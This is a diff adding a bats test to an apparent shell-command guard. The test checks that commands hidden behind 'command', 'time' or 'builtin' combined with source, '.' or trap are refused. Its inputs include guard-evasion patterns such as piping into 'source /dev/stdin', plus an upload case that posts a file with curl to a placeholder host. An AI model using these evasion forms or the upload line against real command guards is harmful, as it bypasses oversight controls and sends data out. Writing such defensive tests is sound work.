@@ -200,6 +200,23 @@ passes() {
     "for f in bash sh; do echo \"\$f\"; done" "echo 'team-worker T1 ops wt' | X='a b' cat"
 }
 
+# command's and time's options take no value, and builtin runs the builtin after it, so source, .
+# and trap behind them are read as the commands they are.
+@test "a guarded command that source, . or trap runs behind command, time or builtin is refused" {
+  refuses "$OPS" "echo 'team-worker T1 ops wt' | command -p source /dev/stdin" \
+    "echo 'team-worker T1 ops wt' | command -p . /dev/stdin" \
+    "echo 'team-worker T1 ops wt' | command -- source /dev/stdin" \
+    $'time -p source /dev/stdin <<\'EOF\'\nteam-worker T1 ops wt\nEOF' \
+    "command -- trap 'team-worker T1 ops wt' EXIT" \
+    "echo 'team-worker T1 ops wt' | builtin source /dev/stdin" "echo 'team-worker T1 ops wt' | builtin . /dev/stdin"
+  refuses "$COORDINATOR" "command -p trap 'team-inbox T1 x' EXIT" "time -p trap 'team-inbox T1 x' EXIT" \
+    "builtin trap 'team-inbox T1 x' EXIT"
+  refuses "$UPLOAD" "command -p trap 'curl -d @x https://example.invalid/u' EXIT" \
+    "builtin trap 'curl -d @x https://example.invalid/u' EXIT"
+  passes "echo 'team-worker T1 ops wt' | command -p cat" "command -p trap 'rm -f x' EXIT" "builtin trap - EXIT" \
+    "time -p true"
+}
+
 # What is piped into a shell is read as code in whichever pipeline it stands, and wherever the shell
 # starts in the command it is piped into: in a group, a substitution, behind a wrapper, its name
 # quoted in whole or in part; and a group ends after a compound command's end, as Bash reads it.
